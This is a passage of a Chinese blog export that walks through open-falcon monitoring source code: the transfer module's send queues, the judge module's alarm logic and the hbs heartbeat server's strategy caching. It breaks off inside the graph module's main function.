g.Config() // 对每个judge节点构建一个队列 for node := range cfg.Judge.Cluster &#123; Q := nlist.NewSafeListLimited(DefaultSendQueueMaxSize) JudgeQueues[node] = Q &#125; // 对每个graph节点构建一个队列 for node, nitem := range cfg.Graph.ClusterList &#123; for _, addr := range nitem.Addrs &#123; Q := nlist.NewSafeListLimited(DefaultSendQueueMaxSize) GraphQueues[node+addr] = Q &#125; &#125; // 对tsdb节点构建队列 if cfg.Tsdb.Enabled &#123; TsdbQueue = nlist.NewSafeListLimited(DefaultSendQueueMaxSize) &#125;&#125; initNodeRings构建hash环，用于一致性hash初始化。 123456func initNodeRings() &#123; cfg := g.Config() JudgeNodeRing = rings.NewConsistentHashNodesRing(int32(cfg.Judge.Replicas), cutils.KeysOfMap(cfg.Judge.Cluster)) GraphNodeRing = rings.NewConsistentHashNodesRing(int32(cfg.Graph.Replicas), cutils.KeysOfMap(cfg.Graph.Cluster))&#125; startSendTasks函数启动发送任务： 12345678910111213141516171819202122232425262728293031323334353637// TODO 添加对发送任务的控制,比如stop等func startSendTasks() &#123; cfg := g.Config() // init semaphore judgeConcurrent := cfg.Judge.MaxConns graphConcurrent := cfg.Graph.MaxConns tsdbConcurrent := cfg.Tsdb.MaxConns if tsdbConcurrent &lt; 1 &#123; tsdbConcurrent = 1 &#125; if judgeConcurrent &lt; 1 &#123; judgeConcurrent = 1 &#125; if graphConcurrent &lt; 1 &#123; graphConcurrent = 1 &#125; // init send go-routines for node := range cfg.Judge.Cluster &#123; queue := JudgeQueues[node] go forward2JudgeTask(queue, node, judgeConcurrent) &#125; for node, nitem := range cfg.Graph.ClusterList &#123; for _, addr := range nitem.Addrs &#123; queue := GraphQueues[node+addr] go forward2GraphTask(queue, node, addr, graphConcurrent) &#125; &#125; if cfg.Tsdb.Enabled &#123; go forward2TsdbTask(tsdbConcurrent) &#125;&#125; forward2JudgeTask函数用于启动judge发送任务： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// Judge定时任务, 将 Judge发送缓存中的数据 通过rpc连接池 发送到Judgefunc forward2JudgeTask(Q *list.SafeListLimited, node string, concurrent int) &#123; batch := g.Config().Judge.Batch // 一次发送,最多batch条数据 addr := g.Config().Judge.Cluster[node] sema := nsema.NewSemaphore(concurrent) for &#123; items := Q.PopBackBy(batch) count := len(items) if count == 0 &#123; time.Sleep(DefaultSendTaskSleepInterval) continue &#125; judgeItems := make([]*cmodel.JudgeItem, count) for i := 0; i &lt; count; i++ &#123; judgeItems[i] = items[i].(*cmodel.JudgeItem) &#125; // 同步Call + 有限并发 进行发送 sema.Acquire() go func(addr string, judgeItems []*cmodel.JudgeItem, count int) &#123; defer sema.Release() resp := &amp;cmodel.SimpleRpcResponse&#123;&#125; var err error sendOk := false for i := 0; i &lt; 3; i++ &#123; //最多重试3次 // 调用judge rpc send接口发送数据 err = JudgeConnPools.Call(addr, \"Judge.Send\", judgeItems, resp) if err == nil &#123; sendOk = true break &#125; time.Sleep(time.Millisecond * 10) &#125; // statistics if !sendOk &#123; log.Printf(\"send judge %s:%s fail: %v\", node, addr, err) proc.SendToJudgeFailCnt.IncrBy(int64(count)) &#125; else &#123; proc.SendToJudgeCnt.IncrBy(int64(count)) &#125; &#125;(addr, judgeItems, count) &#125;&#125; forward2GraphTask启动发送存档数据： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// Graph定时任务, 将 Graph发送缓存中的数据 通过rpc连接池 发送到Graphfunc forward2GraphTask(Q *list.SafeListLimited, node string, addr string, concurrent int) &#123; batch := g.Config().Graph.Batch // 一次发送,最多batch条数据 sema := nsema.NewSemaphore(concurrent) for &#123; items := Q.PopBackBy(batch) //从队列中pop指定大小的数据 count := len(items) if count == 0 &#123; time.Sleep(DefaultSendTaskSleepInterval) continue &#125; graphItems := make([]*cmodel.GraphItem, count) for i := 0; i &lt; count; i++ &#123; graphItems[i] = items[i].(*cmodel.GraphItem) &#125; sema.Acquire() go func(addr string, graphItems []*cmodel.GraphItem, count int) &#123; defer sema.Release() resp := &amp;cmodel.SimpleRpcResponse&#123;&#125; var err error sendOk := false for i := 0; i &lt; 3; i++ &#123; //最多重试3次 // 给graph接口发送数据 err = GraphConnPools.Call(addr, \"Graph.Send\", graphItems, resp) if err == nil &#123; sendOk = true break &#125; time.Sleep(time.Millisecond * 10) &#125; // statistics // 统计数据，方便后续排查当前队列中发送失败和成功数据量 if !sendOk &#123; log.Printf(\"send to graph %s:%s fail: %v\", node, addr, err) proc.SendToGraphFailCnt.IncrBy(int64(count)) &#125; else &#123; proc.SendToGraphCnt.IncrBy(int64(count)) &#125; &#125;(addr, graphItems, count) &#125;&#125; 如果有使用tsdb的话，启动tsdb发送task，这边不说了，基本流程类似。 12345678910111213141516171819202122232425262728293031323334353637383940414243// Tsdb定时任务, 将数据通过api发送到tsdbfunc forward2TsdbTask(concurrent int) &#123; batch := g.Config().Tsdb.Batch // 一次发送,最多batch条数据 retry := g.Config().Tsdb.MaxRetry sema := nsema.NewSemaphore(concurrent) for &#123; items := TsdbQueue.PopBackBy(batch) if len(items) == 0 &#123; time.Sleep(DefaultSendTaskSleepInterval) continue &#125; // 同步Call + 有限并发 进行发送 sema.Acquire() go func(itemList []interface&#123;&#125;) &#123; defer sema.Release() var tsdbBuffer bytes.Buffer count := len(itemList) for i := 0; i &lt; count; i++ &#123; tsdbItem := itemList[i].(*cmodel.TsdbItem) tsdbBuffer.WriteString(tsdbItem.TsdbString()) tsdbBuffer.WriteString(\"\\n\") &#125; var err error for i := 0; i &lt; retry; i++ &#123; err = TsdbConnPoolHelper.Send(tsdbBuffer.Bytes()) if err == nil &#123; proc.SendToTsdbCnt.IncrBy(int64(len(itemList))) break &#125; time.Sleep(100 * time.Millisecond) &#125; if err != nil &#123; proc.SendToTsdbFailCnt.IncrBy(int64(len(itemList))) log.Println(err) return &#125; &#125;(items) &#125;&#125; 接下来函数startSenderCron函数中： 12345// send_cron程序入口func startSenderCron() &#123; go startProcCron() //发送队列统计 go startLogCron() //打印日志&#125; 发送队列统计数据 123456789func calcSendCacheSize(mapList map[string]*list.SafeListLimited) int64 &#123; var cnt int64 = 0 for _, list := range mapList &#123; if list != nil &#123; cnt += int64(list.Len()) &#125; &#125; return cnt&#125; 接收数据函数 1234func Start() &#123; go rpc.StartRpc() // rpc接口数据，接收数据 go socket.StartSocket() // tcp方式推送数据&#125; 主要看rpc接口，因为socket方式也是小米提供的，底层传输的方法一样。 rpc update接口用于更新数据并打到缓存队列中去，update方法最终调用RecvMetricValues函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119// process new metric valuesfunc RecvMetricValues(args []*cmodel.MetricValue, reply *cmodel.TransferResponse, from string) error &#123; start := time.Now() reply.Invalid = 0 items := []*cmodel.MetaData&#123;&#125; for _, v := range args &#123; if v == nil &#123; reply.Invalid += 1 continue &#125; // 历史遗留问题. // 老版本agent上报的metric=kernel.hostname的数据,其取值为string类型,现在已经不支持了;所以,这里硬编码过滤掉 // 很多的过滤策略。 if v.Metric == \"kernel.hostname\" &#123; reply.Invalid += 1 continue &#125; if v.Metric == \"\" || v.Endpoint == \"\" &#123; reply.Invalid += 1 continue &#125; if v.Type != g.COUNTER &amp;&amp; v.Type != g.GAUGE &amp;&amp; v.Type != g.DERIVE &#123; reply.Invalid += 1 continue &#125; if v.Value == \"\" &#123; reply.Invalid += 1 continue &#125; if v.Step &lt;= 0 &#123; reply.Invalid += 1 continue &#125; if len(v.Metric)+len(v.Tags) &gt; 510 &#123; reply.Invalid += 1 continue &#125; // TODO 呵呵,这里需要再优雅一点 now := start.Unix() if v.Timestamp &lt;= 0 || v.Timestamp &gt; now*2 &#123; v.Timestamp = now &#125; fv := &amp;cmodel.MetaData&#123; Metric: v.Metric, Endpoint: v.Endpoint, Timestamp: v.Timestamp, Step: v.Step, CounterType: v.Type, Tags: cutils.DictedTagstring(v.Tags), //TODO tags键值对的个数,要做一下限制 &#125; valid := true var vv float64 var err error switch cv := v.Value.(type) &#123; case string: vv, err = strconv.ParseFloat(cv, 64) if err != nil &#123; valid = false &#125; case float64: vv = cv case int64: vv = float64(cv) default: valid = false &#125; if !valid &#123; reply.Invalid += 1 continue &#125; fv.Value = vv items = append(items, fv) &#125; // statistics cnt := int64(len(items)) proc.RecvCnt.IncrBy(cnt) // 统计 if from == \"rpc\" &#123; proc.RpcRecvCnt.IncrBy(cnt) &#125; else if from == \"http\" &#123; proc.HttpRecvCnt.IncrBy(cnt) &#125; cfg := g.Config() // 打到对应的缓存队列中去。 if cfg.Graph.Enabled &#123; sender.Push2GraphSendQueue(items) &#125; if cfg.Judge.Enabled &#123; sender.Push2JudgeSendQueue(items) &#125; if cfg.Tsdb.Enabled &#123; sender.Push2TsdbSendQueue(items) &#125; reply.Message = \"ok\" reply.Total = len(args) reply.Latency = (time.Now().UnixNano() - start.UnixNano()) / 1000000 return nil&#125; 函数push2GraphSendQueue函数： 123456789101112131415161718192021222324252627282930313233343536373839// 将数据 打入 某个Graph的发送缓存队列, 具体是哪一个Graph 由一致性哈希 决定func Push2GraphSendQueue(items []*cmodel.MetaData) &#123; cfg := g.Config().Graph for _, item := range items &#123; // 转换数据 graphItem, err := convert2GraphItem(item) if err != nil &#123; log.Println(\"E:\", err) continue &#125; pk := item.PK() // statistics. 为了效率,放到了这里,因此只有graph是enbale时才能trace proc.RecvDataTrace.Trace(pk, item) proc.RecvDataFilter.Filter(pk, item.Value, item) // 得到对应的一致性hash分片节点 node, err := GraphNodeRing.GetNode(pk) if err != nil &#123; log.Println(\"E:\", err) continue &#125; cnode := cfg.ClusterList[node] errCnt := 0 for _, addr := range cnode.Addrs &#123; Q := GraphQueues[node+addr] // 获取队列并推送到缓存队列中去 if !Q.PushFront(graphItem) &#123; errCnt += 1 &#125; &#125; // statistics if errCnt &gt; 0 &#123; proc.SendToGraphDropCnt.Incr() &#125; &#125;&#125; 其他两个函数基本类似，都是使用这种方式来将数据推送的内存队列中，然后使用send task 任务发送出去。队列不会堆积，因为发送的时候会出队，不过这样如果发送三次还是失败，这个数据就丢失了。。只能通过统计数据来定位了。","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"open-falcon judge 源码分析","slug":"judge源码分析","date":"2020-01-21T09:07:45.892Z","updated":"2020-01-21T09:06:22.000Z","comments":true,"path":"2020/01/21/judge源码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/21/judge%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"open-falcon judge源码分析judge模块主要流程在modules/judge/main 1234567891011121314151617181920212223242526272829303132func main() &#123; g.BinaryName = BinaryName g.Version = Version g.GitCommit = GitCommit cfg := flag.String(\"c\", \"cfg.json\", \"configuration file\") version := flag.Bool(\"v\", false, \"show version\") flag.Parse() if *version &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; //解析配置文件 g.ParseConfig(*cfg) // 初始化数据库连接池 g.InitRedisConnPool() // 初始化HBS客户端 g.InitHbsClient() //初始化存储，初始化内存BigMap，存储采集历史数据 store.InitHistoryBigMap() //http服务启动 go http.Start() // rpc服务启动 go rpc.Start() //定时从HBS同步策略 go cron.SyncStrategies() //清理无效数据 go cron.CleanStale() select &#123;&#125;&#125; http服务接口数据，注册route: 1234func init() &#123; configCommonRoutes() configInfoRoutes()&#125; 再看下rpc接口，judge主要有Send函数来做： 123456789101112131415func (this *Judge) Send(items []*model.JudgeItem, resp *model.SimpleRpcResponse) error &#123; remain := g.Config().Remain // 把当前时间的计算放在最外层，是为了减少获取时间时的系统调用开销 now := time.Now().Unix() for _, item := range items &#123; exists := g.FilterMap.Exists(item.Metric) if !exists &#123; continue &#125; pk := item.PrimaryKey() // 接收数据，将数据放到bigMap中去 store.HistoryBigMap[pk[0:2]].PushFrontAndMaintain(pk, item, remain, now) &#125; return nil&#125; 函数推送 12345678910111213141516func (this *JudgeItemMap) PushFrontAndMaintain(key string, val *model.JudgeItem, maxCount int, now int64) &#123; // 如果这个keys存在了则压入队列，如果不存在放入队列之后调用judge函数判断 if linkedList, exists := this.Get(key); exists &#123; needJudge := linkedList.PushFrontAndMaintain(val, maxCount) if needJudge &#123; Judge(linkedList, val, now) &#125; &#125; else &#123; NL := list.New() NL.PushFront(val) safeList := &amp;SafeLinkedList&#123;L: NL&#125; this.Set(key, safeList) Judge(safeList, val, now) &#125;&#125; 检查Strategy和expression: 1234func Judge(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) &#123; CheckStrategy(L, firstItem, now) CheckExpression(L, firstItem, now)&#125; 123456789101112131415161718192021222324252627func CheckStrategy(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) &#123; key := fmt.Sprintf(\"%s/%s\", firstItem.Endpoint, firstItem.Metric) strategyMap := g.StrategyMap.Get() strategies, exists := strategyMap[key] if !exists &#123; return &#125; for _, s := range strategies &#123; // 因为key仅仅是endpoint和metric，所以得到的strategies并不一定是与当前judgeItem相关的 // 比如lg-dinp-docker01.bj配置了两个proc.num的策略，一个name=docker，一个name=agent // 所以此处要排除掉一部分 related := true for tagKey, tagVal := range s.Tags &#123; if myVal, exists := firstItem.Tags[tagKey]; !exists || myVal != tagVal &#123; related = false break &#125; &#125; // 查找到相关的指标，然后judge对应的策略 if !related &#123; continue &#125; judgeItemWithStrategy(L, s, firstItem, now) &#125;&#125; judgeItemWithStrategy函数寻找相应的策略： 1234567891011121314151617181920212223func judgeItemWithStrategy(L *SafeLinkedList, strategy model.Strategy, firstItem *model.JudgeItem, now int64) &#123; fn, err := ParseFuncFromString(strategy.Func, strategy.Operator, strategy.RightValue) if err != nil &#123; log.Printf(\"[ERROR] parse func %s fail: %v. strategy id: %d\", strategy.Func, err, strategy.Id) return &#125; //判断是否需要触发，如果满足条件，则发送事件 historyData, leftValue, isTriggered, isEnough := fn.Compute(L) if !isEnough &#123; return &#125; event := &amp;model.Event&#123; Id: fmt.Sprintf(\"s_%d_%s\", strategy.Id, firstItem.PrimaryKey()), Strategy: &amp;strategy, Endpoint: firstItem.Endpoint, LeftValue: leftValue, EventTime: firstItem.Timestamp, PushedTags: firstItem.Tags, &#125; // 发送事件 sendEventIfNeed(historyData, isTriggered, now, event, strategy.MaxStep)&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445func sendEventIfNeed(historyData []*model.HistoryData, isTriggered bool, now int64, event *model.Event, maxStep int) &#123; lastEvent, exists := g.LastEvents.Get(event.Id) if isTriggered &#123; event.Status = \"PROBLEM\" if !exists || lastEvent.Status[0] == 'O' &#123; // 本次触发了阈值，之前又没报过警，得产生一个报警Event event.CurrentStep = 1 // 但是有些用户把最大报警次数配置成了0，相当于屏蔽了，要检查一下 if maxStep == 0 &#123; return &#125; sendEvent(event) return &#125; // 逻辑走到这里，说明之前Event是PROBLEM状态 if lastEvent.CurrentStep &gt;= maxStep &#123; // 报警次数已经足够多，到达了最多报警次数了，不再报警 return &#125; if historyData[len(historyData)-1].Timestamp &lt;= lastEvent.EventTime &#123; // 产生过报警的点，就不能再使用来判断了，否则容易出现一分钟报一次的情况 // 只需要拿最后一个historyData来做判断即可，因为它的时间最老 return &#125; if now-lastEvent.EventTime &lt; g.Config().Alarm.MinInterval &#123; // 报警不能太频繁，两次报警之间至少要间隔MinInterval秒，否则就不能报警 return &#125; event.CurrentStep = lastEvent.CurrentStep + 1 sendEvent(event) //发送事件，函数将报警事件存储到redis队列中去。 &#125; else &#123; // 如果LastEvent是Problem，报OK，否则啥都不做 if exists &amp;&amp; lastEvent.Status[0] == 'P' &#123; event.Status = \"OK\" event.CurrentStep = 1 sendEvent(event) &#125; &#125;&#125; 检查表达式是否满足要求： 1234567891011121314151617181920212223242526func CheckExpression(L *SafeLinkedList, firstItem *model.JudgeItem, now int64) &#123; keys := buildKeysFromMetricAndTags(firstItem) if len(keys) == 0 &#123; return &#125; // expression可能会被多次重复处理，用此数据结构保证只被处理一次 handledExpression := make(map[int]struct&#123;&#125;) expressionMap := g.ExpressionMap.Get() for _, key := range keys &#123; expressions, exists := expressionMap[key] if !exists &#123; continue &#125; //过滤相关表达式 related := filterRelatedExpressions(expressions, firstItem) for _, exp := range related &#123; if _, ok := handledExpression[exp.Id]; ok &#123; continue &#125; handledExpression[exp.Id] = struct&#123;&#125;&#123;&#125; judgeItemWithExpression(L, exp, firstItem, now) &#125; &#125;&#125; 类似的满足要求发送事件给redis： 123456789101112131415161718192021222324func judgeItemWithExpression(L *SafeLinkedList, expression *model.Expression, firstItem *model.JudgeItem, now int64) &#123; fn, err := ParseFuncFromString(expression.Func, expression.Operator, expression.RightValue) if err != nil &#123; log.Printf(\"[ERROR] parse func %s fail: %v. expression id: %d\", expression.Func, err, expression.Id) return &#125; historyData, leftValue, isTriggered, isEnough := fn.Compute(L) if !isEnough &#123; return &#125; event := &amp;model.Event&#123; Id: fmt.Sprintf(\"e_%d_%s\", expression.Id, firstItem.PrimaryKey()), Expression: expression, Endpoint: firstItem.Endpoint, LeftValue: leftValue, EventTime: firstItem.Timestamp, PushedTags: firstItem.Tags, &#125; sendEventIfNeed(historyData, isTriggered, now, event, expression.MaxStep)&#125; 其中使用fn.Compute使用的是离群点检测函数，更多请参考3-sigma算法，https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rulestddev(#10) = 3 //取最新 10 个点的数据分别计算得到他们的标准差和均值，分别计为 σ 和 μ，其中当前值计为 X，那么当 X 落在区间 [μ-3σ, μ+3σ] 之外时则报警。 接下来SyncStrategies函数从HBS同步策略： 123456789func SyncStrategies() &#123; duration := time.Duration(g.Config().Hbs.Interval) * time.Second for &#123; syncStrategies() //同步策略 syncExpression() //同步表达式 syncFilter() //同步过滤器 time.Sleep(duration) &#125;&#125; 12345678910func syncStrategies() &#123; var strategiesResponse model.StrategiesResponse err := g.HbsClient.Call(\"Hbs.GetStrategies\", model.NullRpcRequest&#123;&#125;, &amp;strategiesResponse) //调用HBS rpc接口数据数据 if err != nil &#123; log.Println(\"[ERROR] Hbs.GetStrategies:\", err) return &#125; rebuildStrategyMap(&amp;strategiesResponse) //重建策略数据结构&#125; 12345678910func syncExpression() &#123; var expressionResponse model.ExpressionResponse err := g.HbsClient.Call(\"Hbs.GetExpressions\", model.NullRpcRequest&#123;&#125;, &amp;expressionResponse) //调用HBS接口返回数据 if err != nil &#123; log.Println(\"[ERROR] Hbs.GetExpressions:\", err) return &#125; rebuildExpressionMap(&amp;expressionResponse) // 重建表达式数据结构&#125; 123456789101112131415161718192021func syncFilter() &#123; m := make(map[string]string) //M map[string][]model.Strategy strategyMap := g.StrategyMap.Get() for _, strategies := range strategyMap &#123; for _, strategy := range strategies &#123; m[strategy.Metric] = strategy.Metric &#125; &#125; //M map[string][]*model.Expression expressionMap := g.ExpressionMap.Get() for _, expressions := range expressionMap &#123; for _, expression := range expressions &#123; m[expression.Metric] = expression.Metric &#125; &#125; g.FilterMap.ReInit(m) // 设置获取到的map数据结构&#125;","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"open-falcon hbs 源码分析","slug":"hbs源码分析","date":"2020-01-21T09:07:45.159Z","updated":"2020-01-21T09:06:11.000Z","comments":true,"path":"2020/01/21/hbs源码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/21/hbs%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"open-falcon hbs源码分析本篇文章主要分析下open-falcon中hbs如何实现的： 主流程再modules/hbs/main.go模块中： 1234567891011121314151617181920212223242526272829303132333435363738func main() &#123; g.BinaryName = BinaryName g.Version = Version g.GitCommit = GitCommit cfg := flag.String(\"c\", \"cfg.json\", \"configuration file\") version := flag.Bool(\"v\", false, \"show version\") flag.Parse() if *version &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; // 解析配置文件 g.ParseConfig(*cfg) // 初始化数据库，检查数据库是否可以连接，连接失败退出。 db.Init() // 初始化缓存，从数据库中查询数据加载到缓存中。 cache.Init() // 删除没有心跳的agent go cache.DeleteStaleAgents() // 启动hbs http服务 go http.Start() // 启动 rpc服务 go rpc.Start() //信号量检查 sigs := make(chan os.Signal, 1) signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM) go func() &#123; &lt;-sigs fmt.Println() db.DB.Close() os.Exit(0) &#125;() select &#123;&#125;&#125; db初始化函数Init: 123456789101112131415func Init() &#123; var err error DB, err = sql.Open(\"mysql\", g.Config().Database) if err != nil &#123; log.Fatalln(\"open db fail:\", err) &#125; DB.SetMaxOpenConns(g.Config().MaxConns) DB.SetMaxIdleConns(g.Config().MaxIdle) err = DB.Ping() if err != nil &#123; log.Fatalln(\"ping db fail:\", err) &#125;&#125; 初始化缓存数据： 1234567891011121314151617181920212223242526272829303132333435func Init() &#123; log.Println(\"cache begin\") // 查询group与plugins的关系到缓存中 log.Println(\"#1 GroupPlugins...\") GroupPlugins.Init() // 查询group与template的关系到缓存中 log.Println(\"#2 GroupTemplates...\") GroupTemplates.Init() // 查询host与group的关系到缓存中 log.Println(\"#3 HostGroupsMap...\") HostGroupsMap.Init() //查询所有的host信息到缓存，方便查询hostname-&gt;id log.Println(\"#4 HostMap...\") HostMap.Init() //查询所有的template信息到缓存中 log.Println(\"#5 TemplateCache...\") TemplateCache.Init() //查询对应模块的策略信息到缓存中 log.Println(\"#6 Strategies...\") Strategies.Init(TemplateCache.GetMap()) //查询host与template的缓存信息，一个id对应多个模块ID log.Println(\"#7 HostTemplateIds...\") HostTemplateIds.Init() //查询所有表达式到缓存中 log.Println(\"#8 ExpressionCache...\") ExpressionCache.Init() // 查询被监控的host信息缓存 log.Println(\"#9 MonitoredHosts...\") MonitoredHosts.Init() log.Println(\"cache done\") go LoopInit() //定时查询更新，比较消耗资源。&#125; 定时检查当前agents列表中的信息心跳最后更新时间： 12345678910111213141516func deleteStaleAgents() &#123; // 一天都没有心跳的Agent，从内存中干掉 before := time.Now().Unix() - 3600*24 keys := Agents.Keys() count := len(keys) if count == 0 &#123; return &#125; for i := 0; i &lt; count; i++ &#123; curr, _ := Agents.Get(keys[i]) if curr.LastUpdate &lt; before &#123; Agents.Delete(curr.ReportRequest.Hostname) &#125; &#125;&#125; http服务初始化： 12345//init函数func init() &#123; configCommonRoutes() //注册通用api configProcRoutes() //注册获取策略等信息&#125; rpc接口初始化： 12345678910111213141516171819202122232425func Start() &#123; addr := g.Config().Listen server := rpc.NewServer() // server.Register(new(filter.Filter)) server.Register(new(Agent)) server.Register(new(Hbs)) l, e := net.Listen(\"tcp\", addr) if e != nil &#123; log.Fatalln(\"listen error:\", e) &#125; else &#123; log.Println(\"listening\", addr) &#125; for &#123; conn, err := l.Accept() if err != nil &#123; log.Println(\"listener accept fail:\", err) time.Sleep(time.Duration(100) * time.Millisecond) continue &#125; go server.ServeCodec(jsonrpc.NewServerCodec(conn)) &#125;&#125; 基本流程分析完毕，我们主要来看下hbs提供出来的rpc函数有那些： agent rpc接口： 1234MinePlugin函数主要从缓存中查询plugins插件列表ReportStatus获取到agent来的状态数据，更新缓存中的数据TrustableIps白名单，从配置文件中读取BuiltinMetrics，agent按照server端的配置，按需采集的metric hbs rpc接口： 12GetExpressions 获取查询表达式GetStrategies 获取strategy策略，用于judge调用 我们来看下这个函数GetStrategies，这个函数主要用于给judge定时更新策略的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556func (t *Hbs) GetStrategies(req model.NullRpcRequest, reply *model.StrategiesResponse) error &#123; reply.HostStrategies = []*model.HostStrategy&#123;&#125; // 一个机器ID对应多个模板ID hidTids := cache.HostTemplateIds.GetMap() sz := len(hidTids) if sz == 0 &#123; return nil &#125; // Judge需要的是hostname，此处要把HostId转换为hostname // 查出的hosts，是不处于维护时间内的 hosts := cache.MonitoredHosts.Get() if len(hosts) == 0 &#123; // 所有机器都处于维护状态，汗 return nil &#125; // 查询所有模板信息 tpls := cache.TemplateCache.GetMap() if len(tpls) == 0 &#123; return nil &#125; //查询所有策略信息 strategies := cache.Strategies.GetMap() if len(strategies) == 0 &#123; return nil &#125; // 做个索引，给一个tplId，可以很方便的找到对应了哪些Strategy tpl2Strategies := Tpl2Strategies(strategies) hostStrategies := make([]*model.HostStrategy, 0, sz) for hostId, tplIds := range hidTids &#123; h, exists := hosts[hostId] if !exists &#123; continue &#125; // 计算当前host配置了哪些监控策略 ss := CalcInheritStrategies(tpls, tplIds, tpl2Strategies) if len(ss) &lt;= 0 &#123; continue &#125; hs := model.HostStrategy&#123; Hostname: h.Name, Strategies: ss, &#125; hostStrategies = append(hostStrategies, &amp;hs) &#125; reply.HostStrategies = hostStrategies return nil&#125; Tpl2Strategies函数根据strategies查询所有模板信息： 1234567891011121314func Tpl2Strategies(strategies map[int]*model.Strategy) map[int][]*model.Strategy &#123; ret := make(map[int][]*model.Strategy) for _, s := range strategies &#123; if s == nil || s.Tpl == nil &#123; continue &#125; if _, exists := ret[s.Tpl.Id]; exists &#123; ret[s.Tpl.Id] = append(ret[s.Tpl.Id], s) &#125; else &#123; ret[s.Tpl.Id] = []*model.Strategy&#123;s&#125; &#125; &#125; return ret&#125; CalcInheritStrategies函数用于计算当前host机器有多少策略： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899func CalcInheritStrategies(allTpls map[int]*model.Template, tids []int, tpl2Strategies map[int][]*model.Strategy) []model.Strategy &#123; // 根据模板的继承关系，找到每个机器对应的模板全量 /** * host_id =&gt; * |a |d |a |a |a | * | | |b |b |f | * | | | |c | | * | | | | | | */ tpl_buckets := [][]int&#123;&#125; for _, tid := range tids &#123; // 查找所有id的parentid ids := cache.ParentIds(allTpls, tid) if len(ids) &lt;= 0 &#123; continue &#125; tpl_buckets = append(tpl_buckets, ids) &#125; // 每个host 关联的模板，有继承关系的放到同一个bucket中，其他的放在各自单独的bucket中 /** * host_id =&gt; * |a |d |a | * |b | |f | * |c | | | * | | | | */ count := len(tpl_buckets) uniq_tpl_buckets := [][]int&#123;&#125; for i := 0; i &lt; count; i++ &#123; var valid bool = true for j := 0; j &lt; count; j++ &#123; if i == j &#123; continue &#125; if slice_int_eq(tpl_buckets[i], tpl_buckets[j]) &#123; break &#125; if slice_int_lt(tpl_buckets[i], tpl_buckets[j]) &#123; valid = false break &#125; &#125; if valid &#123; uniq_tpl_buckets = append(uniq_tpl_buckets, tpl_buckets[i]) &#125; &#125; // 继承覆盖父模板策略，得到每个模板聚合后的策略列表 strategies := []model.Strategy&#123;&#125; exists_by_id := make(map[int]struct&#123;&#125;) for _, bucket := range uniq_tpl_buckets &#123; // 开始计算一个桶，先计算老的tid，再计算新的，所以可以覆盖 // 该桶最终结果 bucket_stras_map := make(map[string][]*model.Strategy) for _, tid := range bucket &#123; // 一个tid对应的策略列表 the_tid_stras := make(map[string][]*model.Strategy) if stras, ok := tpl2Strategies[tid]; ok &#123; for _, s := range stras &#123; uuid := fmt.Sprintf(\"metric:%s/tags:%v\", s.Metric, utils.SortedTags(s.Tags)) if _, ok2 := the_tid_stras[uuid]; ok2 &#123; the_tid_stras[uuid] = append(the_tid_stras[uuid], s) &#125; else &#123; the_tid_stras[uuid] = []*model.Strategy&#123;s&#125; &#125; &#125; &#125; // 覆盖父模板 for uuid, ss := range the_tid_stras &#123; bucket_stras_map[uuid] = ss &#125; &#125; last_tid := bucket[len(bucket)-1] // 替换所有策略的模板为最年轻的模板 for _, ss := range bucket_stras_map &#123; for _, s := range ss &#123; valStrategy := *s // exists_by_id[s.Id] 是根据策略ID去重，不太确定是否真的需要，不过加上肯定没问题 if _, exist := exists_by_id[valStrategy.Id]; !exist &#123; if valStrategy.Tpl.Id != last_tid &#123; valStrategy.Tpl = allTpls[last_tid] &#125; strategies = append(strategies, valStrategy) exists_by_id[valStrategy.Id] = struct&#123;&#125;&#123;&#125; &#125; &#125; &#125; &#125; return strategies&#125; hbs中主要的功能分析完毕。相应的需要结合judge和agent来看各个rpc接口调用关系了。","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"open-falcon graph 源码分析","slug":"graph源码分析","date":"2020-01-21T09:07:44.425Z","updated":"2020-01-21T09:06:00.000Z","comments":true,"path":"2020/01/21/graph源码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/21/graph%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"open-falcon graph源码分析graph主流程在modules/graph/main中： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849func main() &#123; g.BinaryName = BinaryName g.Version = Version g.GitCommit = GitCommit cfg := flag.String(\"c\", \"cfg.json\", \"specify config file\") version := flag.Bool(\"v\", false, \"show version\") versionGit := flag.Bool(\"vg\", false, \"show version and git commit log\") flag.Parse() if *version &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; if *versionGit &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; // global config // 解析配置文件 g.ParseConfig(*cfg) if g.Config().Debug &#123; g.InitLog(\"debug\") &#125; else &#123; 